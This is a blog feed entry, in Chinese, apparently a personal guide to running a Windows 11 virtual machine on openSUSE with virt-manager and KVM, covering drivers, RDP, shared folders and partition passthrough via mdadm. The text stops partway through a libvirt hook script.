<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>arttnba3&#39;s blog</title>
  
  <subtitle>arttnba3的秘密小屋</subtitle>
  <link href="https://arttnba3.github.io/atom.xml" rel="self"/>
  
  <link href="https://arttnba3.github.io/"/>
  <updated>2024-02-27T17:35:00.358Z</updated>
  <id>https://arttnba3.github.io/</id>
  
  <author>
    <name>arttnba3</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>【SUSE.0x00】在 openSUSE 上食用 Win VM</title>
    <link href="https://arttnba3.github.io/2024/02/27/SUSE-0X00_WIN_VM_SETUP_GUIDE/"/>
    <id>https://arttnba3.github.io/2024/02/27/SUSE-0X00_WIN_VM_SETUP_GUIDE/</id>
    <published>2024-02-27T03:22:58.000Z</published>
    <updated>2024-02-27T17:35:00.358Z</updated>
    
    <content type="html"><![CDATA[<p>4202 年了，Linux Desktop 还会好吗？</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00. 一切开始之前"></a>0x00. 一切开始之前</h1><p>笔者自从 <code>Win 物理机 + Linux VM</code> 转到 <code>Almost all in Linux</code> 的生活已经过了大半年了，用 openSUSE 也已经小半年了，除了 Nvidia on Wayland 日常撕裂以及盒盖行为设定为 <code>Lock Screen</code> 会醒不来以外似乎还没有太多问题，但除了代码以外的日常生活总感觉不是特别彳亍：</p><h3 id="音乐"><a href="#音乐" class="headerlink" title="音乐"></a>音乐</h3><p>笔者比较喜欢使用酷狗音乐进行听歌（ <del>👴一直都是高贵的酷狗年费会员啊</del> ），但是酷狗是没有官方的 Linux 安装包的，使用 wine 兼任层可以跑起来但是笔者捣鼓了大半天都没有声音：(</p><blockquote><p>Arch 社区打的酷狗 AUR 包似乎可以正常播放，但是笔者也没有时间重新弄回 Arch 了，更没有那个闲时间去研究怎么在 SUSE 上弄了</p></blockquote><p>网易云音乐 <em>曾经有 Linux 版，但是用的 deb 打包，而且也非常久没有更新了，现在官网上也下架 Linux 版了</em> 因为笔者不常用网易云所以也没有尝试用 wine 跑过，但以 wine 现在的水平估计也不会好到哪去（</p><blockquote><p>腾讯音乐之类的就没有用过也不太打算尝试了：）</p></blockquote><p>海外的大部分听歌软件像 <a href="https://www.spotify.com/">Spotify</a> 都是有 <a href="https://www.spotify.com/au/download/linux/">Linux 版</a> 的，但是笔者也会听一些非常小众的歌，这些在 Spotify 上都是没有的，上边只有那些国际化大歌曲（ <del>这就不得不提国内很多小众音乐人的含金量了，什么叫世界第一强国啊</del> ）</p><p>但这还不算最要命的，Sportify 有个非常致命且非常 sb 的设计——<strong>电脑端的 Spotify 每听个一两首歌就会插入一段广告来逼你开会员</strong>，这样的产品策略让笔者很难去使用一些比较正面的词汇去进行评价</p><p><img src="https://s2.loli.net/2024/02/21/MRftUv7gSXDbn8I.png" alt="try not to c*m in 30 seconds"></p><h3 id="Office-套件"><a href="#Office-套件" class="headerlink" title="Office 套件"></a>Office 套件</h3><p><a href="https://www.libreoffice.org/discover/libreoffice/">LibreOffice</a> 作为大部分 Linux 发行版都会默认带着的开源 Office 套件，用着感觉虽然还行但是和 Microsoft Office 相比总感觉有哪里差点意思（<del>就是用着总感觉有哪里不得劲</del>），当然临时顶用其实还好但是 <em>直接重启切回 Windows 写文档不好么</em></p><p>——Microsoft Office 虽然没有 Linux 版但是有个网页版，支持在网页进行编辑甚至在网页上完成 PPT 演示的功能，但是网页版的用着总感觉 <em>也还是差点意思</em> ，而且和 native app 相比总感觉有些卡卡的，唯一的优点大概就是 all on cloud 不用担心数据丢失了：</p><p><img src="https://s2.loli.net/2024/02/21/K4tE6BdfTzigPDL.png" alt="临时做个 PPT 演示还行，但是这样为什么不直接用 Windows 呢"></p><blockquote><p>至于国产 Office 套件 <a href="https://www.wps.com/">WPS</a>，技术水平暂且不谈,当笔者在自家老母亲的旧电脑上打开这软件后跳出一堆各种花花绿绿的广告铺满屏幕然后让电脑变得特别特别卡的时候笔者就决定<strong>哪怕再多花点钱多买几套正版的 Office 也不会再考虑这一款国产软件</strong></p><blockquote><p>当然，除了这个问题以外，WPS 还存在<a href="https://www.zhihu.com/question/542676012">数据安全问题</a>，那这是否就有点…</p></blockquote></blockquote><h3 id="办公软件"><a href="#办公软件" class="headerlink" title="办公软件"></a>办公软件</h3><p>在这个 QQ 都转向 NTQQ 的 4202 年微信还是迟迟不出 Linux 版就令人很难评了<del>这就不得不提某人的含马量了（）</del>，使用 wine 来运行 WeChat 勉强算是一个可行的策略，但是强行用 wine 跑起来的微信只能说是勉强能用，各种功能缺失以及不完整再加上 wine 的功能不完善带来的令人难以直视的各种边框更是让人想要毁灭世界，而功能本就缺失的网页版微信也慢慢变得不再可用，想要在 openSUSE 上完美使用微信似乎已经变成了一种奢求</p><p><img src="https://s2.loli.net/2024/02/23/FoyxtmMUnrJzel9.png" alt="有没有深圳上单能去猎一下某人的🐎.jpg"></p><p>海外的办公软件如 Slack 和 Discord （这个大概勉强也能算办公软件）倒是有原生 Linux 版，What’s App 有网页版但是笔者倒是没有用过，Teams 则只有网页版可用</p><blockquote><p>飞书以及其海外版 Lark 却是都有非常好用的原生 Linux 版， <del>那这里👴就不得不夸一夸👴的前东家国际化大企业字节跳动的含金量了</del> </p><p>至于像钉钉这样的软件似乎也是有 Linux 版，不过笔者基本用不到这个软件所以暂且就不进行深入了解了</p></blockquote><h3 id="游戏及各类其它问题"><a href="#游戏及各类其它问题" class="headerlink" title="游戏及各类其它问题"></a>游戏及各类其它问题</h3><p>这里就不展开说了，因为前面已经讲了这么多废话了，同时笔者也懒得再打字了，总而言之 Linux 除了与计算机专业直接强相关的东西以外似乎都没有比较完美的原生解决方案，这令笔者十分苦恼 ：(</p><h2 id="How-to-解决？"><a href="#How-to-解决？" class="headerlink" title="How to 解决？"></a>How to 解决？</h2><p>让我们重新回顾《虚拟化导论》中的一个基本概念：<code>只要我们能够通过某种方式向上层提供表现相同的抽象接口，在上层看来我们就是正常的该层所提供的资源，从而就实现了对该层的虚拟化</code> ；因此对于 <code>想要在 Linux 下运行 Windows 独占的软件</code> 这个需求而言，我们只需要提供一个相应的兼容层便能运行——<a href="https://www.winehq.org/">wine</a> 便是这样一个软件，其通过提供相应的 Windows 执行环境（如重新实现各种 DLL）来实现，虽然说目前已经能够流畅地运行很多原生 Windows 软件，但是要把整个 Windows 都给重新实现一遍的工作量相当巨大，至少就目前而言还是缺少相当多的各种不同的运行库，难以真正地在 *NIX 系统上完美无缝运行 Windows 下的二进制程序</p><p><img src="https://s2.loli.net/2024/02/23/6asVIrGX1WygDmq.png" alt="网易云其实原本是有 Linux 原生的，可惜前几年终止开发了"></p><p>重新再看虚拟化层次的划分，Wine 是通过实现了 API 抽象层来完成 Windows 各种运行库的虚拟化，那么再往下一层呢——若是我们能够实现硬件抽象层，我们便能完成操作系统级的虚拟化，这样我们自然便有了一个对应操作系统的完整运行环境——即通过<strong>虚拟机</strong>（Virtual Machine）来运行一个完整的 Windows 系统，这样<strong>我们便能完美运行原生的 Windows 程序</strong> ，若是之后我们再将一些必要的设备给 passthrough 进 Windows 中（或是纯模拟也行）、建立好完善的共享文件夹等机制，我们便能舒适地将 Windows 虚拟机融入到我们的 Linux 物理机当中：）</p><blockquote><p>当然，虚拟机的性能损耗肯定是有的，但很多情况下这些性能损耗其实无所谓 ：）</p></blockquote><p><img src="https://s2.loli.net/2022/08/02/lDLgE6tyNe87M12.png"></p><p>因此本篇文章将教大家如何在 Linux 上优雅地食用 Windows 虚拟机</p><blockquote><p>——好吧， <em>运行一个 Windows 虚拟机来跑 Windows 程序这件事似乎是没有任何的新意</em> ，<strong>但若是我们能够通过 RDP 连接直接映射不同的程序窗口而非整个桌面呢？</strong> ——<code>远程桌面协议</code>（Remote Desktop Protocol）让通过网络的远程计算机桌面图像传输与鼠标键盘事件传输成为了可能，同时 xfreerdp 支持仅传输单个应用窗口，由此<strong>我们就能达成在 Linux 桌面中近乎完美地原生运行 Windows 程序的效果</strong></p><p><img src="https://s2.loli.net/2024/02/21/uqlDdERXCQpo3Z7.png" alt="image.png"></p><p>不过由于各种问题，<strong>目前这种办法依然存在较大的 bug，没办法足够舒适地运行</strong>，目前而言只能继续期待后人的努力：）</p></blockquote><h1 id="0x01-通过-Virt-Manager-KVM-运行一个-Windows-虚拟机"><a href="#0x01-通过-Virt-Manager-KVM-运行一个-Windows-虚拟机" class="headerlink" title="0x01. 通过 Virt-Manager + KVM 运行一个 Windows 虚拟机"></a>0x01. 通过 Virt-Manager + KVM 运行一个 Windows 虚拟机</h1><h2 id="安装虚拟化相关组件"><a href="#安装虚拟化相关组件" class="headerlink" title="安装虚拟化相关组件"></a>安装虚拟化相关组件</h2><blockquote><p>参考 <a href="https://doc.opensuse.org/documentation/leap/virtualization/html/book-virtualization/index.html">openSUSE - Virtualization Guide</a> 和 <a href="https://zh.opensuse.org/KVM">openSUSE wiki - KVM</a> 以及 <a href="https://documentation.suse.com/zh-cn/sles/15-SP4/html/SLES-all/cha-kvm-intro.html"> SUSE Linux Enterprise Server 文档 - 虚拟化指南</a></p></blockquote><p>首先检查自己的 CPU 是否支持硬件虚拟化（<del>不过这个年代应该没有不支持硬件虚拟化的 CPU 了吧</del>）：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo LC_ALL=C lscpu | grep Virtualization</span><br></code></pre></td></tr></table></figure><blockquote><p>如果没有结果的话重启进 BIOS&#x2F;UEFI 里开一下，有些机型默认不会开启 CPU 虚拟化，<del>若是真的不支持硬件虚拟化那笔者还是建议你赶紧换一台电脑，或者至少换个 U 吧，都什么年代还在用传统电脑</del></p></blockquote><p>然后安装 libvirt,一个非常舒适的虚拟机管理库，这里直接用 YaST 来安会非常方便：</p><p><img src="https://s2.loli.net/2024/02/21/MeTP9qdfWFSRG6g.png" alt="这就是我们 SUSE 的 YaST 啊，你们有没有这样的 YaST 啊，真是 YY 又 aa、SS 又 TT 啊.jpg"></p><blockquote><p>这里笔者安完才发现忘了勾上 <code>KVM server</code> 了，但是再打开发现按钮灰了没办法补勾上…..不过也无所谓了反正看这篇文章的小伙伴记得勾上就好 ：）</p></blockquote><p>然后安装 virt-manager 和 libvirt-daemon：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo zypper <span class="hljs-keyword">in</span> virt-manager libvirt-daemon</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo systemctl <span class="hljs-built_in">enable</span> libvirtd</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo systemctl start libvirtd</span><br></code></pre></td></tr></table></figure><blockquote><p>QEMU 的话因为要做 kernel pwn 的缘故笔者很早就安装上了所以安装步骤这里就略过了，这里大家就自己想办法安吧（笑</p></blockquote><p>在 <code>.bash_profile</code> 里导入这个变量：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">export</span> LIBVIRT_DEFAULT_URI=qemu:///system<br></code></pre></td></tr></table></figure><p>把自己加相应的组里再重启：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo usermod -a -G libvirt $(<span class="hljs-built_in">whoami</span>)</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo usermod -a -G kvm $(<span class="hljs-built_in">whoami</span>)</span><br></code></pre></td></tr></table></figure><p>配置 default 网络：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo virsh net-define /usr/share/libvirt/networks/default.xml</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo virsh net-autostart default</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo virsh net-start default</span><br></code></pre></td></tr></table></figure><blockquote><p>注：libvirt 默认的 NAT 网络<strong>似乎有些小问题</strong> （参见 <a href="https://doc.opensuse.org/documentation/leap/virtualization/html/book-virtualization/cha-libvirt-host.html">openSUSE doc</a>），如果你没法联网那笔者还是建议使用桥接模式</p></blockquote><h2 id="安装-Windows-虚拟机"><a href="#安装-Windows-虚拟机" class="headerlink" title="安装 Windows 虚拟机"></a>安装 Windows 虚拟机</h2><p>首先在 virt-manager 里 enable 上 xml 编辑：</p><p><img src="https://s2.loli.net/2024/02/22/ZgwYWakbBunNDTR.png" alt="image.png"></p><p>然后下载 <a href="https://www.microsoft.com/software-download/windows11">Windows ISO</a> 和 <a href="https://fedorapeople.org/groups/virt/virtio-win/direct-downloads/stable-virtio/virtio-win.iso">KVM virtio Drivers</a></p><p>之后在 virt-manager 里创建一个虚拟机，创建过程中别忘了勾上 <code>Customize configuration before install</code> ，完成基本配置后挂上第二个 ISO：</p><p><img src="https://s2.loli.net/2024/02/22/BrWcYaihNm83lu9.png" alt="image.png"></p><p>然后在 CPU 的 XML 里编辑 <code>clock</code> ，<strong>修改为如下配置</strong> ,这样可以减少待机开销：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">clock</span> <span class="hljs-attr">offset</span>=<span class="hljs-string">&#x27;localtime&#x27;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">timer</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&#x27;hpet&#x27;</span> <span class="hljs-attr">present</span>=<span class="hljs-string">&#x27;yes&#x27;</span>/&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">timer</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&#x27;hypervclock&#x27;</span> <span class="hljs-attr">present</span>=<span class="hljs-string">&#x27;yes&#x27;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">clock</span>&gt;</span><br></code></pre></td></tr></table></figure><p>启用 <code>shared memory</code> ：</p><p><img src="https://s2.loli.net/2024/02/22/lgUtwfdYejPDprI.png"></p><p>其他的比如说：</p><ul><li>virt-manager 里该 VM 名字改为 <code>RDPWindows</code></li><li>配置自启动</li><li>硬盘类型改为 virtio</li><li>网卡模型改为 virtio（可选）</li></ul><p>之类的过程笔者这里就略过了，网上资料一大把：）</p><p>接下来 <code>Begin Installation</code> 然后就是：Windows，启动————</p><blockquote><p>忘了截开始界面了，无所谓了</p></blockquote><p>我们的硬盘是 virtio 的，所以首先是 <code>加载驱动程序</code>：</p><p><img src="https://s2.loli.net/2024/02/22/iKncHYCWN3XwAkU.png"></p><p>Windows 安装程序会自动扫到我们的 virtio 驱动的 CD，直接选对应版本：</p><p><img src="https://s2.loli.net/2024/02/22/7JUZdRSg68VINnk.png"></p><p>Windows 11 默认没有网不给安装非常 sb，不过 <code>shift + F10</code> 唤出 cmd 输入 <code>OOBE\BYPASSNRO</code> 重新开始就能绕过了：</p><p><img src="https://s2.loli.net/2024/02/22/pOfl2IcSr9YbxtC.png"></p><p>进系统以后找到我们的 virtio 驱动光碟，运行 <code>virtio-win-gt-x64.msi</code> 和 <code>virtio-win-guest-tools.exe</code> 安驱动（全选就行），然后就有网了：</p><p><img src="https://s2.loli.net/2024/02/22/AIfG5mivr6zN9yu.png"></p><p>然后开浏览器把 <a href="https://github.com/Fmstrat/winapps/blob/main/install/RDPApps.reg">https://github.com/Fmstrat/winapps/blob/main/install/RDPApps.reg</a> 下载到本地并右键 <code>合并</code> ：</p><p><img src="https://s2.loli.net/2024/02/22/Ilq7dp9ocfCzFTm.png"></p><p>然后进设置里开远程桌面就行：</p><p><img src="https://s2.loli.net/2024/02/22/yWUONuJ5z9CX2hg.png"></p><h2 id="配置-Guest-与-Host-间的数据共享"><a href="#配置-Guest-与-Host-间的数据共享" class="headerlink" title="配置 Guest 与 Host 间的数据共享"></a>配置 Guest 与 Host 间的数据共享</h2><p>为了方便直接通过 virt-manager 使用 VM，还可以进 VM 里安装 <a href="https://www.spice-space.org/download/windows/spice-guest-tools/spice-guest-tools-latest.exe">spice-guest-tools</a>，这样便能支持 Host 与 Guest 之间各种不管是文本还是图片的各种互相复制粘贴了</p><blockquote><p>如果剪贴板共享坏了，在 <code>服务</code> 里检查一下 <code>SPICE</code> 相关服务是不是挂了，如果经常挂的话建议配置为 <code>自动（延迟启动）</code></p></blockquote><p>对于 Host 与 Guest 之间的文件传输，使用 <code>共享文件夹</code> 似乎是一个不错的方法，将 VM 关机后进入设置中添加一个新的 <code>Filesystem</code> virtio 设备即可：</p><p><img src="https://s2.loli.net/2024/02/22/l9ASvEDfMkzyBUt.png"></p><p>接下来在 Guest VM 中安装 <a href="https://winfsp.dev/">WinFSP</a>（Windows File System Proxy），aka FUSE for Windows，用以挂载我们的共享文件夹</p><p><img src="https://s2.loli.net/2024/02/22/O8BhKgX5WY47tuR.png" alt="只安装 Core 其实也行"></p><p>前面我们已经安装过 virtio 驱动了，所以这里直接重启就行，打开设备管理器后我们便能看到一个 VirtIO FS 设备：</p><p><img src="https://s2.loli.net/2024/02/22/ksPrQjNEvtylWwA.png"></p><p>在 <code>服务</code> 中找到 <code>VirtIO-FS Service</code> 将其设为 <code>自动</code> ，<code>应用</code> 后点击 <code>启动</code>：</p><p><img src="https://s2.loli.net/2024/02/22/Pabrv2cozpUhKYu.png"></p><p>然后就 ok 了：</p><p><img src="https://s2.loli.net/2024/02/22/atYk9XEob2nf6h4.png"></p><blockquote><p>如果你在配置了共享文件夹后 VM 无法启动，且提示 <code>virtiofsd died unexpectedly</code> ，首先检查 <code>/var/log/libvirt/qemu/</code> 下的相关日志文件，若有类似 <code>libvirt:  error : cannot execute binary /usr/libexec/virtiofsd/virtiofsd: Permission denied</code> 这样的提示，则有可能是 <code>AppArmor</code> 的原因</p><p>解决方案是在 <code>/etc/apparmor.d/usr.sbin.libvirtd</code> 中适当的位置添加一行：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/usr/</span>&#123;lib,lib64,lib<span class="hljs-regexp">/qemu,libexec&#125;/</span>virtiofsd/* PUx,<br></code></pre></td></tr></table></figure><p>之后 <code>sudo service apparmor restart</code> 重启 AppArmor，理论上此时便能正常启动了</p><p>若还是不行，则检查 <strong>libvirtd 服务是否存活</strong>，并进行重启</p></blockquote><blockquote><p>如果重启后你的 VM 无法连上网，可能是防火墙禁止了转发（通过 <code>iptables -A FORWARD -j ACCEPT</code> 命令启用转发），也可能是 libvirtd 莫名其妙挂了，<del>也可能是玄学问题多重启几遍就莫名其妙好了</del></p></blockquote><h2 id="Extra-同一物理磁盘分区直通-（not-recommend）"><a href="#Extra-同一物理磁盘分区直通-（not-recommend）" class="headerlink" title="_Extra. 同一物理磁盘分区直通_（not recommend）"></a>_Extra. 同一物理磁盘分区直通_（not recommend）</h2><blockquote><p>参考<a href="https://jianmin.dev/2020/jul/19/boot-your-windows-partition-from-linux-using-kvm/">这篇文章</a></p></blockquote><blockquote><p>注：如果你是在已有数据的分区上进行操作，<strong>请首先确保已经完成了数据备份</strong>！！！</p><p>注2：仅分区直通很容易把 Windows 干碎，然后出现各种问题，<strong>推荐大家还是买个双盘位电脑然后单独通一个盘给 Windows</strong></p></blockquote><p>虚拟机硬盘直通放在 4202 年自然已经不是一件稀奇的事情，但是通常的硬盘直通架构都是要将一整块物理硬盘通给单个虚拟机，若是你和笔者一样买了一部只有单盘位的笔记本（但是笔者的上一部笔记本有三盘位， <del>这次属于是经典考虑不周了</del> ），<strong>同时希望保留原有物理硬盘的 Windows 直接启动的能力</strong>，那么我们只能先预先分好区，之后再<strong>通过将分区建立为新的虚拟磁盘设备的方式</strong>将这部分分区作为一块新磁盘通给虚拟机</p><h3 id="创建-virtual-RAID-disk"><a href="#创建-virtual-RAID-disk" class="headerlink" title="创建 virtual RAID disk"></a>创建 virtual RAID disk</h3><p>首先载入点必要的驱动：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo modprobe loop</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo modprobe linear</span><br></code></pre></td></tr></table></figure><p>接下来创建三个文件作为 GPT 表、 EFI 分区、 GPT 元数据，并挂载为 loopback 设备：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/dev/zero of=gpt bs=1M count=1</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/dev/zero of=efi1 bs=1M count=100</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/dev/zero of=efi2 bs=1M count=1</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo losetup -f gpt</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo losetup -f efi1</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo losetup -f efi2</span><br></code></pre></td></tr></table></figure><p>此时用 <code>losetup -a</code> 应当能看到三个 loopback 设备：</p><p><img src="https://s2.loli.net/2024/02/26/yTtnwX52JzfZYFc.png"></p><p>打开 YaST2 Partitioner （或是其他你所熟悉的能够查看分区信息的工具比如说 <code>fdisk -l</code>），找到原本属于 Windows 的那几个分区<strong>当中的数据分区</strong>：</p><blockquote><p>注：如果你原本就没有已经装好了的 Windows 分区，直接在待用分区上创建一个新的逻辑卷给 Windows 用就行</p></blockquote><p><img src="https://s2.loli.net/2024/02/24/VWeF4iTcSs3qL9n.png" alt="需要注意的是，笔者在安装 Linux 时使用了新的 EFI 分区，而并非和 Windows 共用一个"></p><p>然后使用 madam （Multiple Disk and Device Administration）创建 RAID，以及注意不要把物理盘的 EFI 分区选进来了）：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo mdadm --build --verbose /dev/md0 --chunk=512 --level=linear --raid-devices=6 /dev/loop0 /dev/loop1 /dev/nvme0n1p2 /dev/nvme0n1p3 /dev/nvme0n1p4 /dev/loop2</span><br></code></pre></td></tr></table></figure><p>然后进入 parted 进行分区，<strong>注意分区大小</strong>，注意 <code>mkpart</code>  子命令的格式为 <code>mkpart [part‐type name fs‐type] start end</code> ，<strong>注意自行计算分区起始位置</strong>：</p><blockquote><p>数据无价，谨慎操作！</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo parted /dev/md0</span><br>GNU Parted 3.6<br>Using /dev/md0<br>Welcome to GNU Parted! Type &#x27;help&#x27; to view a list of commands.<br>(parted) unit s                                                           <br>(parted) mktable gpt<br>(parted) mkpart primary fat32 2048 206847                                 <br>(parted) mkpart msr 206848 239615                                         <br>(parted) mkpart primary ntfs 239616 1677961215                            <br>(parted) mkpart primary ntfs 1677961216 -2049                             <br>(parted) set 1 boot on                                                    <br>(parted) set 1 esp on                                                <br>(parted) set 2 msftres on                                                 <br>(parted) set 3 msftdata on                                                <br>(parted) set 4 hidden on                                                  <br>(parted) set 4 diag on                                                    <br>(parted) name 1 EFI                                                       <br>(parted) name 3 Windows                                                   <br>(parted) quit                                                             <br>Information: You may need to update /etc/fstab.<br></code></pre></td></tr></table></figure><p>然后用 <code>mkfs.msdos</code> 格式化 EFI 分区：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo mkfs.msdos -F 32 -n EFI /dev/md0p1</span><br></code></pre></td></tr></table></figure><p>接下来编辑虚拟机磁盘：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">disk</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;block&quot;</span> <span class="hljs-attr">device</span>=<span class="hljs-string">&quot;disk&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">driver</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;qemu&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;raw&quot;</span> <span class="hljs-attr">cache</span>=<span class="hljs-string">&quot;none&quot;</span> <span class="hljs-attr">io</span>=<span class="hljs-string">&quot;native&quot;</span>/&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">source</span> <span class="hljs-attr">dev</span>=<span class="hljs-string">&quot;/dev/md0&quot;</span>/&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">target</span> <span class="hljs-attr">dev</span>=<span class="hljs-string">&quot;vda&quot;</span> <span class="hljs-attr">bus</span>=<span class="hljs-string">&quot;virtio&quot;</span>/&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">boot</span> <span class="hljs-attr">order</span>=<span class="hljs-string">&quot;1&quot;</span>/&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">address</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;pci&quot;</span> <span class="hljs-attr">domain</span>=<span class="hljs-string">&quot;0x0000&quot;</span> <span class="hljs-attr">bus</span>=<span class="hljs-string">&quot;0x04&quot;</span> <span class="hljs-attr">slot</span>=<span class="hljs-string">&quot;0x00&quot;</span> <span class="hljs-attr">function</span>=<span class="hljs-string">&quot;0x0&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">disk</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p>然后重新把我们的 Windows 安装光碟与 virtio 驱动挂上去，放到第一个启动：</p><blockquote><p>注：你需要在启动时 <code>press any key</code> 才会从 CDROM 启动</p></blockquote><p><img src="https://s2.loli.net/2024/02/24/CKQAUWexdacbl3m.png"></p><p>重启后首先按惯例进入安装界面装载 virtio 驱动：</p><p><img src="https://s2.loli.net/2024/02/24/ekb9Qsd82oOc1Nf.png"></p><p>完成后 <code>shift + f10</code> 唤出 cmd，在 <code>diskpart</code> 中找到 EFI 分区，分配驱动号 <code>B</code>：</p><p><img src="https://s2.loli.net/2024/02/24/KOLZMNRl1o6iu3q.png"></p><p>最后通过如下命令将 virtio 驱动注入 C 盘，并在 EFI 分区中配置好启动项：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmd">dism /image:c:\ /add-driver /driver:e:\viostor\w11\amd64\viostor.inf<br>bcdboot C:\Windows /s B: /f ALL<br></code></pre></td></tr></table></figure><p>重启，重新进行账户验证，然后就是见证奇迹的时刻——</p><p><img src="https://s2.loli.net/2024/02/24/P4IqVFUflRMNtsa.png" alt="唉👴的桌面这么私密的空间都给大家看了.jpg"></p><h3 id="通过-libvirt-hook-配置-RAID-自创建与卸载"><a href="#通过-libvirt-hook-配置-RAID-自创建与卸载" class="headerlink" title="通过 libvirt hook 配置 RAID 自创建与卸载"></a>通过 libvirt hook 配置 RAID 自创建与卸载</h3><p>RAID 的配置不能持久化，因此需要我们写一个脚本来在每次启动 VM 前先检查是否创建了 RAID，若否，则先创建 RAID 再启动</p><p>这里我们可以通过创建 <code>/etc/libvirt/hooks/qemu</code> 脚本来实现 VM 启动前的 hook，在其中写入如下内容即可：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><br>VM_NAME=<span class="hljs-string">&quot;Windows11PhysVM&quot;</span><br><br><span 